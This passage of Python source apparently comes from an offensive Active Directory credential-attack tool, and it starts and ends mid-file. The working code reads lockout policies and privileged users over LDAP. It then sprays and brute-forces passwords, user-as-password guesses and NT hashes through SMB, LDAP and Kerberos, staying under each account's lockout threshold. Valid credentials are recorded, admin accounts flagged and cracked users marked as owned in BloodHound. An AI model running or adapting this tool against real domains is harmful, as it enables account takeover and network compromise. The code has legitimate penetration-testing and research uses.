                                    # todo : precedence is ignored for now, we only take the lower lockout threshold for now to insure 100% "no lockouts"
                                    if member_dn in self.granular_lockout_threshold.keys():
                                        if lockout_threshold < self.granular_lockout_threshold[member_dn]:
                                            self.granular_lockout_threshold[member_dn] = lockout_threshold
                                    else:
                                        self.granular_lockout_threshold[member_dn] = lockout_threshold
                            else:
                                if applies_to_dn in self.granular_lockout_threshold.keys():
                                    if lockout_threshold < self.granular_lockout_threshold[applies_to_dn]:
                                        self.granular_lockout_threshold[applies_to_dn] = lockout_threshold
                                else:
                                    self.granular_lockout_threshold[applies_to_dn] = lockout_threshold
                        else:
                            logger.error("Something went wrong when parsing policies information...")
                            exit(0)
                else:
                    if not policy[1][1].hasValue():
                        logger.debug("The policy %s wasn't assigned to any group" % policy[0])
                        continue
                    logger.error("Something went wrong when parsing policies information...")
                    exit(0)
        logger.verbose("Found global lockout threshold (%d) and granular lockout thresholds (%s)" % (self.global_lockout_threshold, list(set(list(self.granular_lockout_threshold.values())))))
        logger.debug("Printing all users target of granular policies")
        for account in self.granular_lockout_threshold.keys():
            logger.debug("   %-5d %s" % (self.granular_lockout_threshold[account], account))


    def is_a_group(self, ldap_connection, object_dn):
        results = ldap_connection.search(searchBase=object_dn, attributes=["objectClass"])
        if "group" in str(results[0][1][0]["vals"]):
            logger.debug("%s is a group" % object_dn)
            return True
        else:
            logger.debug("%s is not a group" % object_dn)
            return False


    def members_dn_from_group_dn(self, ldap_connection, object_dn):
        logger.debug("Fetching members of group: %s" % object_dn)
        members_dn = []
        results = ldap_connection.search(searchBase=object_dn, attributes=["member"])
        for element in results:
            direct_members_dn = element[1][0]["vals"]
            for direct_member_dn in direct_members_dn:
                if self.is_a_group(ldap_connection, direct_member_dn):
                    members_dn += self.members_dn_from_group_dn(ldap_connection, direct_member_dn)
                else:
                    members_dn.append(direct_member_dn.asOctets().decode("utf-8"))
        return members_dn


    def handle_auth_results(self, domain, user, user_dn, password, password_hash, auth, details):
        if password is not None:
            secret = password
        elif password_hash is not None:
            secret = password_hash
        printed_details = []
        if auth:
            logger.debug("[yellow3]Match for domain (%s), user (%s) and password (%s)[/yellow3]" % (domain, user, password))
            if self.options.set_as_owned == True:
                ret = self.neo4j.set_as_owned(user, domain)
                if ret == ERROR_SUCCESS:
                    if self.neo4j.bloodhound_analysis(user, domain) == ERROR_SUCCESS:
                        printed_details.append("[bold red on orange3] PATH TO DA [/bold red on orange3]")
                    logger.verbose("User %s set as owned in neo4j" % user)
                elif ret == ERROR_NEO4J_NON_EXISTENT_NODE:
                    logger.verbose("User {} does not exist in neo4j database".format(user))
                else:
                    return ret

            style = "green"
            if user in self.admin_users:
                printed_details.append("[bold red]admin account[/bold red]")
            elif user in self.special_users:
                printed_details.append("[bold blue]special account[/bold blue]")
            # if details == "KRB_ERR_RESPONSE_TOO_BIG":
            #     logger.verbose("Raised KRB_ERR_RESPONSE_TOO_BIG for domain (%s), user (%s) and password (%s), auth is prbbly ok, set --transport-protocol to tcp to make sure of it" % (self.options.domain, user, password))
            #     printed_details.append("[yellow3](probably valid)[/yellow3]")
            # if details == "KRB_AP_ERR_SKEW":
            #     logger.verbose("Raised KRB_AP_ERR_SKEW for domain (%s), user (%s) and password (%s), auth is prbbly ok, but there is a time skew between the machines" % (self.options.domain, user, password))
            #     printed_details.append("[yellow3](probably valid)[/yellow3]")
            if details == "local admin":
                printed_details.append("[yellow3]%s[/yellow3]" % details)
            self.table.add_row(domain, user, secret, " ".join(printed_details), style=style)
        else:
            # below occurs when testing with the smart mode on so that accounts don't get locked out
            if user_dn is not None:
                self.users[user_dn]["badPwdCount"] += 1
            # we still want to print the disabled accounts
            style = "magenta"
            # SMB auth returns False for auth, account is disabled, but password is ok, something else is wrong
            if details in smb_error_status.keys():
                printed_details.append("[magenta]%s[/magenta]" % smb_error_status[details])
                self.table.add_row(domain, user, secret, " ".join(printed_details), style=style)
            # Kerberos returns pre-auth error meaning account is disabled, but we don't know if password is ok
            elif details == "disabled":
                printed_details.append("[magenta]disabled[/magenta]")
                self.table.add_row(domain, user, "n/a", " ".join(printed_details), style=style)
            # Kerberos returns an error, usually meaning auth is ok but Kerberos can't send TGT through UDP or smth else
            if user in self.admin_users:
                printed_details.append("[bold red]admin account[/bold red]")
            elif user in self.special_users:
                printed_details.append("[bold blue]special account[/bold blue]")
            if details == "KRB_ERR_RESPONSE_TOO_BIG":
                logger.verbose("Raised KRB_ERR_RESPONSE_TOO_BIG for domain (%s), user (%s) and password (%s), auth is prbbly ok, set --transport-protocol to tcp to make sure of it" % (self.options.domain, user, password))
                printed_details.append("[yellow3](probably valid)[/yellow3]")
                style = "green"
                self.table.add_row(domain, user, secret, " ".join(printed_details), style=style)
            if details == "KRB_AP_ERR_SKEW":
                logger.verbose("Raised KRB_AP_ERR_SKEW for domain (%s), user (%s) and password (%s), auth is prbbly ok, but there is a time skew between the machines" % (self.options.domain, user, password))
                logger.verbose("Server time is %s (UTC)" % self.kerberos.server_time)
                printed_details.append("[yellow3](probably valid)[/yellow3]")
                style = "green"
                self.table.add_row(domain, user, secret, " ".join(printed_details), style=style)

    def smart_attack(self):
        logger.info("Bad password counts dont replicate between domain controllers. Only the PDC knows the real amount of those. Be sure to target the PDC so that accounts don't get locked out")
        # https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc775412(v=ws.10)?redirectedfrom=MSDN
        if self.options.auth_protocol == "ntlm":
            logger.verbose("Fetching domain information through NTLM over LDAP")
            # if self.options.auth_domain is None or "." not in self.options.auth_domain:
            #     logger.error("FQDN Domain is needed to fetch domain information from LDAP")
            if self.options.auth_domain is None:
                logger.error("Domain is needed to fetch domain information from LDAP")
            if self.options.auth_dc_ip is not None:
                target = self.options.auth_dc_ip
            else:
                target = self.options.auth_domain
            auth_lm_hash = None
            auth_nt_hash = None
            if self.options.auth_hashes is not None:
                if ":" in self.options.auth_hashes:
                    auth_lm_hash = self.options.auth_hashes.split(":")[0]
                    auth_nt_hash = self.options.auth_hashes.split(":")[1]
                else:
                    auth_nt_hash = self.options.auth_hashes
            
            # Handling LDAPS
            if self.options.auth_use_ldaps:
                try:
                    ldap_connection = self.ntlm.LDAP_authentication(target=target, tls_version=ssl.PROTOCOL_TLSv1_2, domain=self.options.auth_domain, user=self.options.auth_user, password=self.options.auth_password, lm_hash=auth_lm_hash, nt_hash=auth_nt_hash)
                except:
                    ldap_connection = self.ntlm.LDAP_authentication(target=target, tls_version=ssl.PROTOCOL_TLSv1, domain=self.options.auth_domain, user=self.options.auth_user, password=self.options.auth_password, lm_hash=auth_lm_hash, nt_hash=auth_nt_hash)
            else:
                ldap_connection = self.ntlm.LDAP_authentication(target=target, tls_version=None, domain=self.options.auth_domain, user=self.options.auth_user, password=self.options.auth_password, lm_hash=auth_lm_hash, nt_hash=auth_nt_hash)
            
            if ldap_connection:
                logger.success("Successfully logged in, fetching domain information")
                if self.options.enum_users:
                    self.get_users(ldap_connection=ldap_connection, domain=self.options.auth_domain)
                    for user_dn in self.users.keys():
                        self.table.add_row(self.options.auth_domain, self.users[user_dn]["sAMAccountName"])
                elif self.options.enum_policy:
                    self.get_lockout_thresholds(ldap_connection=ldap_connection, domain=self.options.auth_domain)
                    self.get_users(ldap_connection=ldap_connection, domain=self.options.auth_domain)
                    logger.success("Global lockout threshold is: %d" % self.global_lockout_threshold)
                    logger.success("Granular thresholds are as follows: %s" % list(set(list(self.granular_lockout_threshold.values()))))
                    logger.info("Printing table of users and their granular thresholds (in case of multiple PSOs, lowest threshold is kept) (empty table == no granular policies exist)")
                    for user_dn in self.users.keys():
                        if self.users[user_dn]["lockoutThreshold"] != self.global_lockout_threshold:
                            self.table.add_row(self.options.auth_domain, self.users[user_dn]["sAMAccountName"], str(self.users[user_dn]["lockoutThreshold"]))
                else:
                    self.get_lockout_thresholds(ldap_connection=ldap_connection, domain=self.options.auth_domain)
                    self.get_users(ldap_connection=ldap_connection, domain=self.options.auth_domain)
                    self.get_privileged_users(ldap_connection=ldap_connection, domain=self.options.auth_domain)
                    self.domain_is_dumped = True
                    logger.success("Domain enumeration is over, starting attack")
                    k, maxi = 1, len(self.users.keys())
                    for user_dn in self.users.keys():
                        self.table.caption = "  [yellow3]User[/]: %d/%d (%3.1f%%) (%s)" % (k, maxi, round(k/maxi*100,1), self.users[user_dn]["sAMAccountName"])
                        k += 1
                        self.smart_try_user(user_dn)
            else:
                logger.error("Error connecting, username/password might be invalid...")
        elif self.options.auth_protocol == "kerberos":
            logger.debug("Fetching domain information through a Kerberos auth over LDAP")
            if self.options.auth_kdc_ip is not None:
                target = self.options.auth_kdc_ip
            else:
                target = self.options.auth_domain
            if self.options.auth_use_ldaps:
                try:
                    ldap_connection = self.kerberos.LDAP_authentication(kdc_ip=self.options.auth_kdc_ip, tls_version=ssl.PROTOCOL_TLSv1_2, domain=self.options.auth_domain, user=self.options.auth_user, password=self.options.auth_password, rc4_key=self.options.auth_rc4_key, aes_key=self.options.auth_aes_key, ccache_ticket=self.options.auth_ccache_ticket, dc_host=self.options.dc_host)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    ldap_connection = self.kerberos.LDAP_authentication(kdc_ip=self.options.auth_kdc_ip, tls_version=ssl.PROTOCOL_TLSv1, domain=self.options.auth_domain, user=self.options.auth_user, password=self.options.auth_password, rc4_key=self.options.auth_rc4_key, aes_key=self.options.auth_aes_key, ccache_ticket=self.options.auth_ccache_ticket, dc_host=self.options.dc_host)
            else:
                ldap_connection = self.kerberos.LDAP_authentication(kdc_ip=self.options.auth_kdc_ip, tls_version=None, domain=self.options.auth_domain, user=self.options.auth_user, password=self.options.auth_password, rc4_key=self.options.auth_rc4_key, aes_key=self.options.auth_aes_key, ccache_ticket=self.options.auth_ccache_ticket, dc_host=self.options.dc_host)
            if ldap_connection:
                logger.success("Successfully logged in, fetching domain information")
                if self.options.enum_users:
                    self.get_users(ldap_connection=ldap_connection, domain=self.options.auth_domain)
                    for user_dn in self.users.keys():
                        self.table.add_row(self.options.auth_domain, self.users[user_dn]["sAMAccountName"])
                elif self.options.enum_policy:
                    self.get_lockout_thresholds(ldap_connection=ldap_connection, domain=self.options.auth_domain)
                    self.get_users(ldap_connection=ldap_connection, domain=self.options.auth_domain)
                    logger.success("Global lockout threshold is: %d" % self.global_lockout_threshold)
                    logger.success("Granular thresholds are as follows: %s" % list(set(list(self.granular_lockout_threshold.values()))))
                    logger.info("Printing table of users and their granular thresholds (in case of multiple PSOs, lowest threshold is kept) (empty table == no granular policies exist)")
                    for user_dn in self.users.keys():
                        if self.users[user_dn]["lockoutThreshold"] != self.global_lockout_threshold:
                            self.table.add_row(self.options.auth_domain, self.users[user_dn]["sAMAccountName"], str(self.users[user_dn]["lockoutThreshold"]))
                else:
                    self.get_lockout_thresholds(ldap_connection=ldap_connection, domain=self.options.auth_domain)
                    self.get_users(ldap_connection=ldap_connection, domain=self.options.auth_domain)
                    self.get_privileged_users(ldap_connection=ldap_connection, domain=self.options.auth_domain)
                    self.domain_is_dumped = True
                    logger.success("Domain enumeration is over, starting attack")
                    k, maxi = 1, len(self.users.keys())
                    for user_dn in self.users.keys():
                        self.table.caption = "  [yellow3]User[/]: %d/%d (%3.1f%%) (%s)" % (k, maxi, round(k / maxi * 100, 1), self.users[user_dn]["sAMAccountName"])
                        k += 1
                        self.smart_try_user(user_dn)
            else:
                logger.error("Error connecting, username/password might be invalid...")

    def smart_try_user(self, user_dn):
        if self.options.bf_password is not None:
            self.table.caption += "\n  [yellow3]Pass[/]: %d/%d (%3.1f%%)" % (1,1,100)
            self.smart_try_password_or_hash(user_dn=user_dn, password=self.options.bf_password, password_hash=None)
        elif self.options.bf_passwords_file is not None:
            if os.path.exists(self.options.bf_passwords_file):
                with open(self.options.bf_passwords_file, "r") as bf_passwords_file:
                    bf_passwords_file = bf_passwords_file.readlines()
                    k, maxi = 1, len(bf_passwords_file)
                    for password in bf_passwords_file:
                        if "\n  [yellow3]Pass[/]: " not in self.table.caption:
                            self.table.caption += "\n  [yellow3]Pass[/]: %d/%d (%3.1f%%)" % (k, maxi, round(k/maxi*100,1))
                        else:
                            self.table.caption = self.table.caption.split('\n  [yellow3]Pass[/]: ')[0] + "\n  [yellow3]Pass[/]: %d/%d (%3.1f%%)" % (k, maxi, round(k/maxi*100,1))
                        k += 1
                        success = self.smart_try_password_or_hash(user_dn=user_dn, password=password.rstrip(), password_hash=None)
                        if success == True or success is None:
                            break
            else:
                logger.error("File (%s) does not exist" % self.options.bf_passwords_file)
        elif self.options.bf_hash is not None:
            self.table.caption += "\n  [yellow3]Hash[/]: %d/%d (%3.1f%%)" % (1,1,100)
            self.smart_try_password_or_hash(user_dn=user_dn, password=None, password_hash=self.options.bf_hash)
        elif self.options.bf_hashes_file is not None:
            if os.path.exists(self.options.bf_hashes_file):
                with open(self.options.bf_hashes_file, "r") as bf_hashes_file:
                    bf_hashes_file = bf_hashes_file.readlines()
                    # Keeping only NT hashes
                    filtered_hashes, line_no = [], 1
                    for h in bf_hashes_file:
                        line_no += 1
                        h = h.strip()
                        if re.match('[0-9a-f]{32}',h.lower()):
                            filtered_hashes.append(h.lower())
                        else:
                            logger.error("Skipping (%s) on line %d from hashes list as it does not match the NT format." % (h, line_no))
                    # Starting bruteforce with the filtered_hashes
                    k, maxi = 1, len(bf_hashes_file)
                    for password_hash in bf_hashes_file:
                        if "\n  [yellow3]Hash[/]: " not in self.table.caption:
                            self.table.caption += "\n  [yellow3]Hash[/]: %d/%d (%3.1f%%)" % (k, maxi, round(k/maxi*100,1))
                        else:
                            self.table.caption = self.table.caption.split('\n  [yellow3]Hash[/]: ')[0] + "\n  [yellow3]Hash[/]: %d/%d (%3.1f%%)" % (k, maxi, round(k/maxi*100,1))
                        k += 1
                        success = self.smart_try_password_or_hash(user_dn=user_dn, password=None, password_hash=password_hash.rstrip())
                        if success == True or success is None:
                            break
            else:
                logger.error("File (%s) does not exist" % self.options.bf_passwords_file)
        elif self.options.user_as_password:
            user = self.users[user_dn]["sAMAccountName"]
            self.table.caption += "\n  [yellow3]Pass[/]: %d/%d (%3.1f%%)" % (1,1,100)
            self.smart_try_password_or_hash(user_dn=user_dn, password=user, password_hash=None)
        else:
            logger.warning("There is nothing to be done here, no password/hash (or list of) supplied.")
            logger.warning("This is not supposed to happen, exiting...")
            exit(0)


    def smart_try_password_or_hash(self, user_dn, password=None, password_hash=None):
        logger.debug("")
        if (self.users[user_dn]["lockoutThreshold"] - self.users[user_dn]["badPwdCount"] > self.options.lockout_threshold) or self.users[user_dn]["lockoutThreshold"] == 0:
            user = self.users[user_dn]["sAMAccountName"]
            if self.options.bruteforced_protocol == "ntlm":
                if self.options.auth_domain is None:
                    # this is not supposed to happen
                    logger.error("This is not supposed to happen, no domain was set (error: 1337-B1)")
                    domain = ""
                else:
                    domain = self.options.auth_domain
                if self.options.dc_ip is not None:
                    target = self.options.dc_ip
                else:
                    target = domain

                if self.options.application_protocol == "smb":
                    auth, details = self.ntlm.SMB_authentication(target=target, domain=domain, user=user, password=password, nt_hash=password_hash)
                elif self.options.application_protocol == "ldap":

                    # Handling LDAPS
                    if self.options.auth_use_ldaps:
                        try:
                            auth = self.ntlm.LDAP_authentication(target=target, tls_version=ssl.PROTOCOL_TLSv1_2, domain=domain, user=user, password=password, lm_hash=None, nt_hash=password_hash)
                        except:
                            auth = self.ntlm.LDAP_authentication(target=target, tls_version=ssl.PROTOCOL_TLSv1, domain=domain, user=user, password=password, lm_hash=None, nt_hash=password_hash)
                    else:
                        auth = self.ntlm.LDAP_authentication(target=target, tls_version=None, domain=domain, user=user, password=password, lm_hash=None, nt_hash=password_hash)
            
                    # LDAP authentication doesn't throw errors indicating is the user is disabled or something...
                    details = ""
                self.handle_auth_results(domain=domain, user=user, user_dn=user_dn, password=password, password_hash=password_hash, auth=auth, details=details)
                # I'm returning auth instead of True or False because there are scenarios where auth==None, example: when an SMB auth is ok but throws an error on the account (disabled for instance)
                return auth
            elif self.options.bruteforced_protocol == "kerberos":
                if self.options.kdc_ip is not None:
                    target = self.options.kdc_ip
                else:
                    target = self.options.auth_domain
                if user not in self.kerberos.disabled_account and user not in self.kerberos.principal_unknown:
                    try:
                        auth, details = self.kerberos.pre_authentication(target=target, domain=self.options.auth_domain, user=user, password=password, rc4_key=password_hash, etype=self.options.etype, tproto=self.options.transport_protocol)
                        self.handle_auth_results(domain=self.options.auth_domain, user=user, user_dn=user_dn, password=password, password_hash=password_hash, auth=auth, details=details)
                        if auth:
                            return True
                        else:
                            return False
                    except Exception as pre_auth_error:
                        logger.error(pre_auth_error)
                        return None
        else:
            logger.debug("Maximum attempts reached for user %s, reduce --lockout-threshold to bypass" % self.users[user_dn]["sAMAccountName"])


    def bruteforce_attack(self):
        if self.options.bf_user is not None:
            self.table.caption = "  [yellow3]User[/]: %d/%d (%3.1f%%) (%s)" % (1,1,100,self.options.bf_user.rstrip())
            self.bruteforce_try_user(self.options.bf_user)
        elif self.options.line_per_line and self.options.bf_users_file is not None and (self.options.bf_passwords_file is not None or self.options.bf_hashes_file is not None):
            users = []
            if os.path.exists(self.options.bf_users_file):
                with open(self.options.bf_users_file, "r") as bf_users_file:
                    for user in bf_users_file:
                        users.append(user.rstrip())
            if self.options.bf_passwords_file is not None:
                passwords = []
                if os.path.exists(self.options.bf_passwords_file):
                    with open(self.options.bf_passwords_file, "r") as bf_passwords_file:
                        for password in bf_passwords_file.readlines():
                            passwords.append(password.rstrip())
                if len(users) != len(passwords):
                    logger.error("Mismatch between the number of users (%d) and the number of passwords (%d), can't try line per line, exiting..." % (len(users), len(passwords)))
                    exit(0)
                else:
                    maxi = len(users)
                    for i in range(len(users)):
                        self.table.caption = "  [yellow3]User[/]: %d/%d (%3.1f%%) (%s)" % (i, maxi, round(i/maxi*100,1), users[i].rstrip())
                        success = self.bruteforce_try_password_or_hash(user=users[i], password=passwords[i], password_hash=None)
                        if success == True and self.options.stop_on_success == True:
                            logger.debug("Stopping on first successful auth")
                            exit(0)
                        time.sleep(self.options.delay)
            elif self.options.bf_hashes_file is not None:
                password_hashes = []
                if os.path.exists(self.options.bf_hashes_file):
                    with open(self.options.bf_hashes_file, "r") as bf_hashes_file:
                        for password_hash in bf_hashes_file.readlines():
                            password_hashes.append(password_hash.rstrip())
                # Keeping only NT hashes
                filtered_hashes, line_no = [], 1
                for h in password_hashes:
                    line_no += 1
                    h = h.strip()
                    if re.match('[0-9a-f]{32}',h.lower()):
                        filtered_hashes.append(h.lower())
                    else:
                        logger.error("Skipping (%s) on line %d from hashes list as it does not match the NT format." % (h, line_no))
                password_hashes = filtered_hashes
                # Starting bruteforce line by line
                if len(users) != len(password_hashes):
                    logger.error("Mismatch between the number of users (%d) and the number of password hashes (%d), can't try line per line, exiting..." % (len(users), len(password_hashes)))
                    exit(0)
                else:
                    maxi = len(users)
                    for i in range(len(users)):
                        self.table.caption = "  [yellow3]User[/]: %d/%d (%3.1f%%) (%s)" % (i, maxi, round(i/maxi*100,1), users[i].rstrip())
                        success = self.bruteforce_try_password_or_hash(user=users[i], password=None, password_hash=password_hashes[i])
                        if success == True and self.options.stop_on_success == True:
                            logger.debug("Stopping on first successful auth")
                            exit(0)
                        time.sleep(self.options.delay)

        elif self.options.bf_users_file is not None:
            if os.path.exists(self.options.bf_users_file):
                with open(self.options.bf_users_file, "r") as bf_users_file:
                    bf_users_file = bf_users_file.readlines()
                    k, maxi = 1, len(bf_users_file)
                    for user in bf_users_file:
                        self.table.caption = "  [yellow3]User[/]: %d/%d (%3.1f%%) (%s)" % (k, maxi, round(k/maxi*100,1),user.rstrip())
                        k += 1
                        success = self.bruteforce_try_user(user.rstrip())
                        if success == True and self.options.stop_on_success == True:
                            logger.debug("Stopping on first successful auth")
                            exit(0)
                        time.sleep(self.options.delay)
            else:
                logger.error("File (%s) does not exist" % self.options.bf_users_file)
        else:
            logger.error("No user (or list of users) was supplied, there is nothing to bruteforce")

    def bruteforce_try_user(self, user):
        # Bruteforce with passwords
        if self.options.bf_password is not None:
            self.table.caption += "\n  [yellow3]Pass[/]: %d/%d (%3.1f%%)" % (1,1,100)
            return self.bruteforce_try_password_or_hash(user=user, password=self.options.bf_password, password_hash=None)
        elif self.options.bf_passwords_file is not None:
            if os.path.exists(self.options.bf_passwords_file):
                with open(self.options.bf_passwords_file, "r") as bf_passwords_file:
                    bf_passwords_file = bf_passwords_file.readlines()
                    k, maxi = 1, len(bf_passwords_file)
                    for password in bf_passwords_file:
                        if "\n  [yellow3]Pass[/]: " not in self.table.caption:
                            self.table.caption += "\n  [yellow3]Pass[/]: %d/%d (%3.1f%%)" % (k, maxi, round(k/maxi*100,1))
                        else:
                            self.table.caption = self.table.caption.split('\n  [yellow3]Pass[/]: ')[0] + "\n  [yellow3]Pass[/]: %d/%d (%3.1f%%)" % (k, maxi, round(k/maxi*100,1))
                        k += 1
                        success = self.bruteforce_try_password_or_hash(user=user, password=password.rstrip(), password_hash=None)
                        if success == True or success is None:
                            return success
                        time.sleep(self.options.delay)
            else:
                logger.error("File (%s) does not exist" % self.options.bf_passwords_file)
        # Bruteforce with hashes
        elif self.options.bf_hash is not None:
            self.table.caption += "\n  [yellow3]Hash[/]: %d/%d (%3.1f%%)" % (1,1,100)
            return self.bruteforce_try_password_or_hash(user=user, password=None, password_hash=self.options.bf_hash)
        elif self.options.bf_hashes_file is not None:
            if os.path.exists(self.options.bf_hashes_file):
                with open(self.options.bf_hashes_file, "r") as bf_hashes_file:
                    bf_hashes_file = bf_hashes_file.readlines()
                    # Keeping only NT hashes
                    filtered_hashes, line_no = [], 1
                    for h in bf_hashes_file:
                        line_no += 1
                        h = h.strip()
                        if re.match('[0-9a-f]{32}',h.lower()):
                            filtered_hashes.append(h.lower())
                        else:
                            logger.error("Skipping (%s) on line %d from hashes list as it does not match the NT format." % (h, line_no))
                    # Starting bruteforce with the filtered_hashes
                    k, maxi = 1, len(filtered_hashes)
                    for password_hash in filtered_hashes:
                        if "\n  [yellow3]Hash[/]: " not in self.table.caption:
                            self.table.caption += "\n  [yellow3]Hash[/]: %d/%d (%3.1f%%)" % (k, maxi, round(k/maxi*100,1))
                        else:
                            self.table.caption = self.table.caption.split('\n  [yellow3]Hash[/]: ')[0] + "\n  [yellow3]Hash[/]: %d/%d (%3.1f%%)" % (k, maxi, round(k/maxi*100,1))
                        k += 1
                        success = self.bruteforce_try_password_or_hash(user=user, password=None, password_hash=password_hash.rstrip())
                        if success == True or success is None:
                            return success
                        time.sleep(self.options.delay)
            else:
                logger.error("File (%s) does not exist" % self.options.bf_passwords_file)
        elif self.options.user_as_password:
            return self.bruteforce_try_password_or_hash(user=user, password=user, password_hash=None)
        else:
            logger.error("You're not supposed to be here, LEAVE !!! (or debug me senpai)")
            exit(0)
            # if self.options.bruteforced_protocol == "kerberos":
            #     if self.options.kdc_ip is not None:
            #         target = self.options.kdc_ip
            #     else:
            #         target = self.options.domain
            #     salts = self.kerberos.get_users_salts(target=target, domain=self.options.domain, user=user, rc4_key="", etype=self.options.etype, tproto=self.options.transport_protocol)
            #     if user in self.kerberos.disabled_account:
            #         details = "[magenta]disabled[/magenta]"
            #         self.table.add_row(self.options.domain, user, details)
            #     elif salts:
            #         self.table.add_row(self.options.domain, user, "")
            # elif self.options.bruteforced_protocol == "ntlm":
            #     logger.error("No password (or list of passwords) was supplied, users enumeration attack is not possible through ntlm, try with kerberos")
            #     exit(0)


    def bruteforce_try_password_or_hash(self, user, password=None, password_hash=None):
        logger.debug("")
        if self.options.bruteforced_protocol == "ntlm":
            if self.options.domain is None:
                domain = ""
            else:
                domain = self.options.domain
            if self.options.dc_ip is not None:
                target = self.options.dc_ip
            else:
                target = domain

            if self.options.application_protocol == "smb":
                auth, details = self.ntlm.SMB_authentication(target=target, domain=domain, user=user, password=password, nt_hash=password_hash)
                if auth != True and auth != False and not self.domain_is_dumped and not self.options.no_enumeration:
                    if domain == "":
                        logger.verbose("No domain supplied, skipping domain dump despite valid authentication")
                    else:
                        logger.verbose("First successful auth! Starting domain dump to find privileged users")
                                                
                        # Handling LDAPS
                        if self.options.auth_use_ldaps:
                            try:
                                ldap_connection = self.ntlm.LDAP_authentication(target=target, tls_version=ssl.PROTOCOL_TLSv1_2, domain=domain, user=user, password=password, lm_hash=None, nt_hash=password_hash)
                            except:
                                ldap_connection = self.ntlm.LDAP_authentication(target=target, tls_version=ssl.PROTOCOL_TLSv1, domain=domain, user=user, password=password, lm_hash=None, nt_hash=password_hash)
                        else:
                            ldap_connection = self.ntlm.LDAP_authentication(target=target, tls_version=None, domain=domain, user=user, password=password, lm_hash=None, nt_hash=password_hash)
            
                        if ldap_connection:
                            self.get_privileged_users(ldap_connection=ldap_connection, domain=self.options.domain)
                            self.domain_is_dumped = True
                            logger.verbose("Domain enumeration is over, resuming attack")
                self.handle_auth_results(domain=domain, user=user, user_dn=None, password=password, password_hash=password_hash, auth=auth, details=details)
                return auth
            elif self.options.application_protocol == "ldap":

                # Handling LDAPS
                if self.options.auth_use_ldaps:
                    try:
                        auth = self.ntlm.LDAP_authentication(target=target, tls_version=ssl.PROTOCOL_TLSv1_2, domain=domain, user=user, password=password, lm_hash=None, nt_hash=password_hash)
                    except:
                        auth = self.ntlm.LDAP_authentication(target=target, tls_version=ssl.PROTOCOL_TLSv1, domain=domain, user=user, password=password, lm_hash=None, nt_hash=password_hash)
                else:
                    auth = self.ntlm.LDAP_authentication(target=target, tls_version=None, domain=domain, user=user, password=password, lm_hash=None, nt_hash=password_hash)

                # LDAP authentication doesn't throw errors indicating is the user is disabled or something...
                details = ""
                if auth and not self.domain_is_dumped and not self.options.no_enumeration:
                    if domain == "":
                        logger.verbose("No domain supplied, skipping domain dump despite valid authentication")
                    else:
                        logger.verbose("First successful auth! Starting domain dump to find privileged users")
                        
                        # Handling LDAPS
                        if self.options.auth_use_ldaps:
                            try:
                                ldap_connection = self.ntlm.LDAP_authentication(target=target, tls_version=ssl.PROTOCOL_TLSv1_2, domain=domain, user=user, password=password, lm_hash=None, nt_hash=password_hash)
                            except:
                                ldap_connection = self.ntlm.LDAP_authentication(target=target, tls_version=ssl.PROTOCOL_TLSv1, domain=domain, user=user, password=password, lm_hash=None, nt_hash=password_hash)
                        else:
                            ldap_connection = self.ntlm.LDAP_authentication(target=target, tls_version=None, domain=domain, user=user, password=password, lm_hash=None, nt_hash=password_hash)

                        if ldap_connection:
                            self.get_privileged_users(ldap_connection=ldap_connection, domain=self.options.domain)
                            self.domain_is_dumped = True
                            logger.verbose("Domain enumeration is over, resuming attack")
                self.handle_auth_results(domain=domain, user=user, user_dn=None, password=password, password_hash=password_hash, auth=auth, details=details)
                if auth:
                    return True
                else:
                    return False
        elif self.options.bruteforced_protocol == "kerberos":
            if self.options.kdc_ip is not None:
                target = self.options.kdc_ip
            else:
                target = self.options.domain
            if user not in self.kerberos.disabled_account and user not in self.kerberos.principal_unknown:
                try:
                    auth, details = self.kerberos.pre_authentication(target=target, domain=self.options.domain, user=user, password=password, rc4_key=password_hash, etype=self.options.etype, tproto=self.options.transport_protocol)
                    if auth and not self.domain_is_dumped and not self.options.no_enumeration:
                        logger.verbose("First successful auth! Starting domain dump to find privileged users")
                        
                        if self.options.auth_use_ldaps:
                            try:
                                ldap_connection = self.kerberos.LDAP_authentication(kdc_ip=target, tls_version=ssl.PROTOCOL_TLSv1_2, domain=self.options.domain, user=user, password=password, rc4_key=password_hash, aes_key=None, ccache_ticket=None, dc_host=self.options.dc_host)
                            except:
                                ldap_connection = self.kerberos.LDAP_authentication(kdc_ip=target, tls_version=ssl.PROTOCOL_TLSv1, domain=self.options.domain, user=user, password=password, rc4_key=password_hash, aes_key=None, ccache_ticket=None, dc_host=self.options.dc_host)
                        else:
                            ldap_connection = self.kerberos.LDAP_authentication(kdc_ip=target, tls_version=None, domain=self.options.domain, user=user, password=password, rc4_key=password_hash, aes_key=None, ccache_ticket=None, dc_host=self.options.dc_host)

                        if ldap_connection:
                            self.get_privileged_users(ldap_connection=ldap_connection, domain=self.options.domain)
                            self.domain_is_dumped = True
                            logger.verbose("Domain enumeration is over, resuming attack")
                    self.handle_auth_results(domain=self.options.domain, user=user, user_dn=None, password=password, password_hash=password_hash, auth=auth, details=details)
                    if user in self.kerberos.disabled_account or user in self.kerberos.principal_unknown:
                        # returning None, because then, we don't want to continue bruteforce on an account that we know to be disabled or unknown
                        return None
                    else:
                        if auth:
                            return True
                        else:
                            return False
                except Exception as pre_auth_error:
                    logger.error(pre_auth_error)
                    return None


class Neo4jConnection:
    class Options:
        def __init__(self, host, user, password, port, log, edge_blacklist=None):
            self.user = user
            self.password = password
            self.host = host
            self.port = port
            self.log = log
            self.edge_blacklist = edge_blacklist if edge_blacklist is not None else []

    def __init__(self, options):
        self.user = options.user
        self.password = options.password
        self.log = options.log
        self.edge_blacklist = options.edge_blacklist
        self._uri = "bolt://{}:{}".format(options.host, options.port)
        try:
            self._get_driver()
        except Exception as e:
            self.log.error("Failed to connect to Neo4J database")
            raise

    def set_as_owned(self, username, domain):
        user = self._format_username(username, domain)
        query = "MATCH (u:User {{name:\"{}\"}}) SET u.owned=True RETURN u.name AS name".format(user)
        self.log.debug("Query : {}".format(query))
        result = self._run_query(query)
        if len(result) > 0:
            return ERROR_SUCCESS
        else:
            return ERROR_NEO4J_NON_EXISTENT_NODE

    def bloodhound_analysis(self, username, domain):

        edges = [
            "MemberOf",
            "HasSession",
            "AdminTo",
            "AllExtendedRights",
            "AddMember",
            "ForceChangePassword",
            "GenericAll",
            "GenericWrite",
            "Owns",
            "WriteDacl",
            "WriteOwner",
            "CanRDP",
            "ExecuteDCOM",
            "AllowedToDelegate",
            "ReadLAPSPassword",
            "Contains",
            "GpLink",
            "AddAllowedToAct",
